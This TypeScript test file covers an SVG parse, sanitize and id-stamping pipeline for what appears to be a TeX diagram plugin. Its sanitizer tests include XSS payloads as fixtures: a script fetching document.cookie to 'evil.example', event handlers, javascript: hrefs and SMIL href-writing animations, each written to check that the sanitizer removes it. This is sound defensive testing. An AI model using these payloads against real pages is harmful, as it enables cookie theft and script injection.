// @vitest-environment happy-dom
import { describe, expect, it } from 'vitest';
import { NOT_SIGN, SOFT_HYPHEN, remapSoftHyphens } from '../src/svg/entities';
import { ID_TOKEN, IdTokenCollisionError, placeholderIds, stampIds } from '../src/svg/ids';
import { sanitizeSvg, type SanitizerRemoval } from '../src/svg/sanitize';
import { SvgParseError, parseSvg, serializeSvg } from '../src/svg/serialize';
import { TexError } from '../src/types';

const SVG_OPEN = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">';

function svg(body: string): string {
	return `${SVG_OPEN}${body}</svg>`;
}

function kinds(removed: SanitizerRemoval[]): string[] {
	return removed.map((r) => r.kind);
}

describe('parseSvg / serializeSvg', () => {
	it('parses a well-formed SVG and hands back the document element', () => {
		const doc = parseSvg(svg('<g id="page1"><path d="M0 0"/></g>'));
		expect(doc.documentElement.localName).toBe('svg');
		expect(doc.getElementsByTagName('path')).toHaveLength(1);
	});

	it('rejects malformed XML as a typed empty-output error rather than returning the error doc', () => {
		// parseFromString does not throw; it returns a document *describing* the failure. The whole
		// point of the typed error is that a caller cannot accidentally mount that document.
		let thrown: unknown;
		try {
			parseSvg('<svg><g></svg>');
		} catch (e) {
			thrown = e;
		}

		expect(thrown).toBeInstanceOf(SvgParseError);
		expect(thrown).toBeInstanceOf(TexError);
		const err = thrown as SvgParseError;
		expect(err.reason).toBe('parsererror');
		expect(err.kind).toBe('empty-output');
		// One line, bounded: the parser's error document is a multi-line HTML blob.
		expect(err.message.split('\n')).toHaveLength(1);
	});

	it('rejects a document whose root is not <svg>', () => {
		const err = grab(() => parseSvg('<html xmlns="http://www.w3.org/1999/xhtml"><body/></html>'));
		expect(err).toBeInstanceOf(SvgParseError);
		expect((err as SvgParseError).reason).toBe('not-svg');
	});

	it('rejects an <svg> root that is not in the SVG namespace', () => {
		// `<svg>` with no xmlns parses fine and its root is still *called* svg, but it is an
		// element in no namespace: a renderer draws nothing and reports nothing. Accepting it
		// would persist a blank diagram as the artifact and replay it forever. Reachable through
		// the L3 legacy read-through, which replays whatever string the old plugin stored.
		const bare = grab(() => parseSvg('<svg><g id="a"/></svg>'));
		expect(bare).toBeInstanceOf(SvgParseError);
		expect((bare as SvgParseError).reason).toBe('not-svg');

		const wrongNs = grab(() => parseSvg('<h:svg xmlns:h="http://www.w3.org/1999/xhtml"><h:g/></h:svg>'));
		expect((wrongNs as SvgParseError).reason).toBe('not-svg');

		// …and the real thing still parses.
		expect(parseSvg(svg('<g/>')).documentElement.namespaceURI).toBe('http://www.w3.org/2000/svg');
	});

	it('rejects empty and whitespace-only engine output', () => {
		expect((grab(() => parseSvg('')) as SvgParseError).reason).toBe('empty');
		expect((grab(() => parseSvg('   \n\t ')) as SvgParseError).reason).toBe('empty');
	});

	it('round-trips a document through serialize and back', () => {
		const source = svg('<g id="a" clip-path="url(#c)"><use xlink:href="#g1"/></g>');
		const once = serializeSvg(parseSvg(source));
		const twice = serializeSvg(parseSvg(once));
		expect(twice).toBe(once);
		expect(once).toContain('clip-path="url(#c)"');
		expect(once).toContain('#g1');
	});

	it('serializes the root element only, never a sibling comment or PI', () => {
		const out = serializeSvg(parseSvg(`<?xml version="1.0"?><!--engine v1-->${svg('<g/>')}`));
		expect(out.startsWith('<svg')).toBe(true);
		expect(out).not.toContain('engine v1');
	});
});

describe('sanitizeSvg', () => {
	it('neutralises a real dvisvgm:raw payload', () => {
		// This is what `\special{dvisvgm:raw <script>…}` puts through the engine verbatim: the
		// remainder of the special becomes markup in the SVG, and the artifact is then persisted
		// and replayed on every later open of the note.
		const doc = parseSvg(
			svg(
				'<g id="page1" transform="matrix(1,0,0,-1,0,0)">' +
					'<script type="text/javascript">fetch("https://evil.example/" + document.cookie)</script>' +
					'<rect width="10" height="10" onload="alert(1)" onmouseover="alert(2)"/>' +
					'<a href="javascript:alert(3)"><text>click</text></a>' +
					'<foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml">' +
					'<img src="x" onerror="alert(4)"/></body></foreignObject>' +
					'<image xlink:href="https://evil.example/pixel.png"/>' +
					'</g>',
			),
		);

		const removed = sanitizeSvg(doc);
		const out = serializeSvg(doc);

		expect(out).not.toContain('script');
		expect(out).not.toContain('foreignObject');
		expect(out).not.toContain('onload');
		expect(out).not.toContain('onmouseover');
		expect(out).not.toContain('javascript:');
		expect(out).not.toContain('evil.example');
		// The elements that merely *carried* the removed attributes survive: sanitizing must not
		// silently delete the diagram.
		expect(doc.getElementsByTagName('rect')).toHaveLength(1);
		expect(doc.getElementsByTagName('text')).toHaveLength(1);

		expect(kinds(removed).sort()).toEqual([
			'event-handler',
			'event-handler',
			'external-reference',
			'external-reference',
			'foreign-object',
			'script',
		]);
	});

	it('does not report the innards of a node it already removed', () => {
		// A removed <script> full of on* attributes would otherwise flood the degraded chip with
		// findings about markup that is already gone.
		const doc = parseSvg(
			svg('<foreignObject><b onclick="a" onmouseup="b"/><a href="http://x"/></foreignObject>'),
		);
		expect(kinds(sanitizeSvg(doc))).toEqual(['foreign-object']);
	});

	it('leaves legitimate same-document references untouched', () => {
		const source = svg(
			'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath>' +
				'<path id="g1" d="M0 0"/><linearGradient id="grad" xlink:href="#base"/></defs>' +
				'<g clip-path="url(#c)" style="fill:url(#grad)"><use xlink:href="#g1" href="#g1"/></g>',
		);
		const doc = parseSvg(source);
		expect(sanitizeSvg(doc)).toEqual([]);
		expect(serializeSvg(doc)).toBe(serializeSvg(parseSvg(source)));
	});

	it('strips an href that only looks like a fragment', () => {
		// Renderers trim leading whitespace and control characters before resolving a URL, which
		// is exactly what makes these work in the wild.
		for (const bad of [
			' javascript:alert(1)',
			'\njavascript:alert(1)',
			'data:text/html;base64,PHNjcmlwdD4=',
			'//evil.example/x.svg#g',
			'../other.svg#g',
			'#frag javascript:alert(1)',
		]) {
			const doc = parseSvg(svg(`<use xlink:href="${escapeAttr(bad)}"/>`));
			expect(kinds(sanitizeSvg(doc)), bad).toEqual(['external-reference']);
		}
	});

	it('removes a script in the HTML namespace, which a tag selector would miss', () => {
		const doc = parseSvg(svg('<g><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></g>'));
		expect(kinds(sanitizeSvg(doc))).toEqual(['script']);
		expect(serializeSvg(doc)).not.toContain('alert');
	});

	it('bounds the detail it reports, so a megabyte payload cannot reach a notice', () => {
		const doc = parseSvg(svg(`<a href="javascript:${'x'.repeat(5000)}"/>`));
		const removed = sanitizeSvg(doc);
		expect(removed).toHaveLength(1);
		expect(removed[0]!.detail.length).toBeLessThan(120);
	});

	it('removes every on* attribute on one element, not just the first', () => {
		// The NamedNodeMap is live; removing during a forward iteration skips the next entry.
		const doc = parseSvg(svg('<rect onload="a" onclick="b" onfocus="c" fill="#000"/>'));
		expect(kinds(sanitizeSvg(doc))).toEqual(['event-handler', 'event-handler', 'event-handler']);
		expect(serializeSvg(doc)).toContain('fill="#000"');
	});

	it('sanitizes the root <svg> element too', () => {
		// Reachable through the L3 legacy read-through, which replays whatever string the old
		// plugin stored, not only through a raw special inside the current engine's output.
		const doc = parseSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" width="10"><g/></svg>',
		);
		expect(kinds(sanitizeSvg(doc))).toEqual(['event-handler']);
		expect(serializeSvg(doc)).toContain('width="10"');
	});

	it('removes a SMIL animation that writes an href or an event handler', () => {
		// `<set attributeName="xlink:href" to="javascript:…">` is the classic SVG payload: the
		// element carries no href and no on* attribute of its own, so an element/attribute scan
		// passes it, and at animation time it writes exactly the value the href rule refused.
		const doc = parseSvg(
			svg(
				'<a xlink:href="#x">' +
					'<set attributeName="xlink:href" to="javascript:alert(1)"/>' +
					'<animate attributeName="href" values="javascript:alert(2)" begin="0s"/>' +
					'<animate attributeName="onload" to="alert(3)"/>' +
					'<text>click</text>' +
					'</a>',
			),
		);

		expect(kinds(sanitizeSvg(doc)).sort()).toEqual([
			'event-handler',
			'external-reference',
			'external-reference',
		]);
		const out = serializeSvg(doc);
		expect(out).not.toContain('javascript:');
		expect(out).not.toContain('alert');
		// The <a> and its label survive; only the animation elements go.
		expect(doc.getElementsByTagName('text')).toHaveLength(1);
		expect(out).toContain('xlink:href="#x"');
	});

	it('keeps an animation that does not target href or a handler', () => {
		// Over-removal is its own failure: an <animateTransform> on a transform is inert markup.
		const doc = parseSvg(
			svg('<rect><animateTransform attributeName="transform" type="rotate" to="90"/></rect>'),
		);
		expect(sanitizeSvg(doc)).toEqual([]);
		expect(serializeSvg(doc)).toContain('animateTransform');
	});

	it('bounds an event-handler and an element detail, not only an href one', () => {
		// Nothing bounds an XML attribute or element name, and these strings are persisted in
		// `Artifact.warn` and replayed into the degraded chip on every later open.
		const longName = `on${'x'.repeat(4000)}`;
		const doc = parseSvg(svg(`<rect ${longName}="alert(1)"/>`));
		const removed = sanitizeSvg(doc);
		expect(kinds(removed)).toEqual(['event-handler']);
		expect(removed[0]!.detail.length).toBeLessThan(120);

		const animated = parseSvg(svg(`<set attributeName="href" to="javascript:${'y'.repeat(4000)}"/>`));
		const fromAnimation = sanitizeSvg(animated);
		expect(fromAnimation).toHaveLength(1);
		expect(fromAnimation[0]!.detail.length).toBeLessThan(120);
	});

	it('removes adjacent sibling scripts, not every other one', () => {
		// Same hazard for childNodes: `<script/><script/>` is the trivial bypass of a live-list walk.
		const doc = parseSvg(svg('<script>a</script><script>b</script><script>c</script>'));
		expect(kinds(sanitizeSvg(doc))).toEqual(['script', 'script', 'script']);
		expect(doc.documentElement.childNodes).toHaveLength(0);
	});
});

describe('placeholderIds', () => {
	it('rewrites ids in document order and sweeps every reference form', () => {
		const doc = parseSvg(
			svg(
				'<defs><clipPath id="clip1"><rect width="1" height="1"/></clipPath>' +
					'<linearGradient id="grad1"/><marker id="arrow"/><filter id="blur"/>' +
					'<path id="glyph-a" d="M0 0"/></defs>' +
					'<g clip-path="url(#clip1)" fill="url(#grad1)" filter="url(#blur)"' +
					' marker-start="url(#arrow)" marker-end="url( \'#arrow\' )">' +
					'<use xlink:href="#glyph-a"/><use href="#glyph-a"/>' +
					'</g>',
			),
		);

		placeholderIds(doc);
		const out = serializeSvg(doc);

		expect(out).not.toContain('clip1');
		expect(out).not.toContain('grad1');
		expect(out).not.toContain('glyph-a');
		expect(out).toContain(`clip-path="url(#${ID_TOKEN}0)"`);
		expect(out).toContain(`fill="url(#${ID_TOKEN}1)"`);
		expect(out).toContain(`marker-start="url(#${ID_TOKEN}2)"`);
		expect(out).toContain(`filter="url(#${ID_TOKEN}3)"`);
		expect(out).toContain(`xlink:href="#${ID_TOKEN}4"`);
		expect(out).toContain(`href="#${ID_TOKEN}4"`);
		// Quoted and space-padded url() is the same reference; the marker is still id 2.
		expect(out).toContain(`marker-end="url('#${ID_TOKEN}2')"`);
	});

	it('rewrites url(#…) inside a style attribute, not only in a presentation attribute', () => {
		// The half the shipped plugin never had: `style="fill:url(#g)"` is the same reference as
		// `fill="url(#g)"`, and a diagram whose paint arrives through `style` loses it entirely.
		const doc = parseSvg(
			svg(
				'<defs><linearGradient id="g"/><clipPath id="c"><rect/></clipPath></defs>' +
					'<rect style="fill:url(#g);clip-path:url(#c);stroke:#000" width="1" height="1"/>',
			),
		);

		placeholderIds(doc);
		const rect = doc.getElementsByTagName('rect')[1]!;
		expect(rect.getAttribute('style')).toBe(
			`fill:url(#${ID_TOKEN}0);clip-path:url(#${ID_TOKEN}1);stroke:#000`,
		);
	});

	it('rewrites url(#…) in a <style> element but leaves colour-shaped selectors alone', () => {
		const doc = parseSvg(
			svg('<style>#fff { fill: url(#g) } .a { stroke: #fff }</style><linearGradient id="g"/>'),
		);
		placeholderIds(doc);
		const css = doc.getElementsByTagName('style')[0]!.textContent;
		expect(css).toContain(`url(#${ID_TOKEN}0)`);
		expect(css).toContain('stroke: #fff');
	});

	it('leaves a dangling reference alone rather than inventing a target', () => {
		const doc = parseSvg(svg('<g id="a" clip-path="url(#gone)"><use xlink:href="#missing"/></g>'));
		placeholderIds(doc);
		const out = serializeSvg(doc);
		expect(out).toContain('url(#gone)');
		expect(out).toContain('xlink:href="#missing"');
		expect(out).toContain(`id="${ID_TOKEN}0"`);
	});

	it('gives duplicate ids distinct placeholders and keeps references on the first', () => {
		// Duplicate ids are the #12 symptom itself; the output must at least stay well-formed.
		const doc = parseSvg(svg('<path id="g"/><path id="g"/><use xlink:href="#g"/>'));
		placeholderIds(doc);
		const paths = doc.getElementsByTagName('path');
		expect(paths[0]!.getAttribute('id')).toBe(`${ID_TOKEN}0`);
		expect(paths[1]!.getAttribute('id')).toBe(`${ID_TOKEN}1`);
		expect(doc.getElementsByTagName('use')[0]!.getAttribute('xlink:href')).toBe(`#${ID_TOKEN}0`);
	});

	it('throws when the token already occurs, so the caller can pick another one', () => {
		const inAttr = grab(() => placeholderIds(parseSvg(svg(`<g id="${ID_TOKEN}0"/>`))));
		expect(inAttr).toBeInstanceOf(IdTokenCollisionError);

		// Text matters too: stamping is a blind string pass over the serialized template, so a node
		// label reading __TZ__ would be rewritten into another diagram's id space.
		const inText = grab(() => placeholderIds(parseSvg(svg(`<text>${ID_TOKEN}</text>`))));
		expect(inText).toBeInstanceOf(IdTokenCollisionError);

		// …and the documented recovery works: retry with a token of the caller's choosing.
		const doc = parseSvg(svg(`<text>${ID_TOKEN}</text><path id="a"/><use xlink:href="#a"/>`));
		placeholderIds(doc, '__ZZ9__');
		expect(serializeSvg(doc)).toContain('xlink:href="#__ZZ9__0"');
	});

	it('throws when the token occurs in a name, a comment or a PI, not only in a value', () => {
		// The invariant is "the token does not occur anywhere in the serialized template", because
		// stampIds is a blind string pass over that whole string. `__TZ__9` is a well-formed XML
		// name (`_` is a name-start character), and comments and PIs inside the root survive
		// serialization — each would be silently rewritten into a mount's id space.
		for (const body of [
			`<g data-${ID_TOKEN}9="x"/>`,
			`<${ID_TOKEN}9/>`,
			`<!-- ${ID_TOKEN}9 --><g id="a"/>`,
			`<g id="a"/><?tz ${ID_TOKEN}9?>`,
		]) {
			const doc = parseSvg(svg(body));
			expect(
				grab(() => placeholderIds(doc)),
				body,
			).toBeInstanceOf(IdTokenCollisionError);
			// A stamped mount would otherwise carry the caller's token space into foreign markup.
			expect(serializeSvg(doc), body).toContain(ID_TOKEN);
		}
	});

	it('does not touch a document with no ids at all', () => {
		const source = svg('<g><path d="M0 0" fill="#000"/></g>');
		const doc = parseSvg(source);
		placeholderIds(doc);
		expect(serializeSvg(doc)).toBe(serializeSvg(parseSvg(source)));
	});
});

describe('stampIds', () => {
	const template = serializeTemplate(
		'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath><path id="g" d="M0 0"/></defs>' +
			'<g clip-path="url(#c)" style="fill:url(#c)"><use xlink:href="#g"/></g>',
	);

	it('produces disjoint id spaces that are each internally consistent', () => {
		const first = stampIds(template, '1');
		const second = stampIds(template, '2');

		expect(first).not.toContain(ID_TOKEN);
		expect(second).not.toContain(ID_TOKEN);

		for (const [stamped, nonce] of [
			[first, '1'],
			[second, '2'],
		] as const) {
			const doc = parseSvg(stamped);
			const ids = idsOf(doc);
			expect(ids).toEqual([`t${nonce}_0`, `t${nonce}_1`]);
			// Every reference resolves inside its own document — the definition and the reference
			// got the SAME nonce, which is what a per-match replacer would have broken.
			for (const ref of refsOf(doc)) {
				expect(ids, `${ref} in mount ${nonce}`).toContain(ref);
			}
		}

		// Disjoint: nothing from mount 1 appears in mount 2. This is the whole of #12.
		expect(idsOf(parseSvg(first)).some((id) => idsOf(parseSvg(second)).includes(id))).toBe(false);
	});

	it('replaces every occurrence, including adjacent ones', () => {
		expect(stampIds(`${ID_TOKEN}${ID_TOKEN}0`, '3')).toBe('t3_t3_0');
		expect(stampIds('no ids here', '3')).toBe('no ids here');
	});

	it('survives a monkey-patched String.prototype.replaceAll', () => {
		// Pretty BibTeX 2.0.0 replaced this method and silently killed rendering plugin-wide with
		// no error anywhere (upstream #48). The stamp must not go through it.
		const original = String.prototype.replaceAll;
		// eslint-disable-next-line no-extend-native
		String.prototype.replaceAll = function (): string {
			throw new Error('a third-party plugin owns this method now');
		} as typeof String.prototype.replaceAll;
		try {
			expect(stampIds(template, '7')).toContain('t7_0');
		} finally {
			String.prototype.replaceAll = original;
		}
	});

	it('refuses a nonce that would not be a valid id or url(#…) target', () => {
		for (const bad of ['', 'a b', 'a.b', 'a)b', '#x', 'a"b']) {
			expect(() => stampIds(template, bad), bad).toThrow();
		}
	});

	it('keeps two nonces disjoint even when one is a prefix of the other', () => {
		// 't1_' vs 't11_': the trailing separator is what stops `t1_` matching inside `t11_0`.
		const a = idsOf(parseSvg(stampIds(template, '1')));
		const b = idsOf(parseSvg(stampIds(template, '11')));
		expect(a.some((id) => b.includes(id))).toBe(false);
	});
});

describe('remapSoftHyphens', () => {
	it('round-trips the &#173; -> &#172; remap through parse and serialize', () => {
		// The entity is decoded by the parser, so the stage matches the character, and the
		// serializer writes the replacement back out as a literal NOT SIGN.
		const doc = parseSvg(svg('<text>&#173;A&#173;</text>'));
		expect(doc.getElementsByTagName('text')[0]!.textContent).toBe(`${SOFT_HYPHEN}A${SOFT_HYPHEN}`);

		expect(remapSoftHyphens(doc)).toBe(2);
		const out = serializeSvg(doc);
		expect(out).toContain(`${NOT_SIGN}A${NOT_SIGN}`);
		expect(out).not.toContain(SOFT_HYPHEN);
		expect(SOFT_HYPHEN.charCodeAt(0)).toBe(173);
		expect(NOT_SIGN.charCodeAt(0)).toBe(172);
	});

	it('catches the hex spelling and the raw character too', () => {
		const doc = parseSvg(svg(`<text>&#xAD;</text><text>${SOFT_HYPHEN}</text>`));
		expect(remapSoftHyphens(doc)).toBe(2);
		expect(serializeSvg(doc)).not.toContain(SOFT_HYPHEN);
	});

	it('reaches text nested anywhere and reports nothing when there is nothing to do', () => {
		const doc = parseSvg(svg(`<g><g><text><tspan>&#173;</tspan></text></g></g>`));
		expect(remapSoftHyphens(doc)).toBe(1);
		expect(remapSoftHyphens(doc)).toBe(0);
	});

	it('leaves attributes and element names alone', () => {
		const doc = parseSvg(svg(`<g id="a&#173;b" data-x="&#173;"><text>x</text></g>`));
		expect(remapSoftHyphens(doc)).toBe(0);
		expect(doc.getElementsByTagName('g')[0]!.getAttribute('id')).toBe(`a${SOFT_HYPHEN}b`);
	});
});

describe('the stages compose in pipeline order', () => {
	it('takes a hostile, id-carrying diagram to a safe, stampable template', () => {
		const doc = parseSvg(
			svg(
				'<defs><clipPath id="clip1"><rect width="4" height="4"/></clipPath><path id="g0" d="M0 0"/></defs>' +
					'<g clip-path="url(#clip1)" onload="alert(1)">' +
					'<use xlink:href="#g0"/><text>&#173;</text>' +
					'<script>alert(2)</script></g>',
			),
		);

		const removed = sanitizeSvg(doc);
		remapSoftHyphens(doc);
		placeholderIds(doc);
		const template = serializeSvg(doc);

		expect(kinds(removed).sort()).toEqual(['event-handler', 'script']);
		expect(template).not.toContain('alert');
		expect(template).toContain(NOT_SIGN);

		const mounted = parseSvg(stampIds(template, '9'));
		expect(idsOf(mounted)).toEqual(['t9_0', 't9_1']);
		for (const ref of refsOf(mounted)) expect(idsOf(mounted)).toContain(ref);
	});
});

/** Build a stored template the way the pipeline does, so the stamp tests use real output. */
function serializeTemplate(body: string): string {
	const doc = parseSvg(svg(body));
	placeholderIds(doc);
	return serializeSvg(doc);
}

function idsOf(doc: XMLDocument): string[] {
	const out: string[] = [];
	const all = doc.getElementsByTagName('*');
	for (let i = 0; i < all.length; i++) {
		const id = all[i]?.getAttribute('id');
		if (id !== null && id !== undefined) out.push(id);
	}
	return out;
}

/** Every id this document points at, from both `url(#…)` and `href`/`xlink:href`. */
function refsOf(doc: XMLDocument): string[] {
	const out: string[] = [];
	const all = doc.getElementsByTagName('*');
	for (let i = 0; i < all.length; i++) {
		const el = all[i];
		if (!el) continue;
		for (let j = 0; j < el.attributes.length; j++) {
			const attr = el.attributes[j];
			if (!attr || attr.localName === 'id') continue;
			for (const m of attr.value.matchAll(/url\(\s*["']?#([^"'()\s]+)/g)) {
				if (m[1]) out.push(m[1]);
			}
			if (attr.localName === 'href' && attr.value.startsWith('#')) out.push(attr.value.slice(1));
		}
	}
	return out;
}

function grab(fn: () => unknown): unknown {
	try {
		fn();
	} catch (e) {
		return e;
	}
	throw new Error('expected the call to throw, but it returned');
}

function escapeAttr(value: string): string {
	return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
}
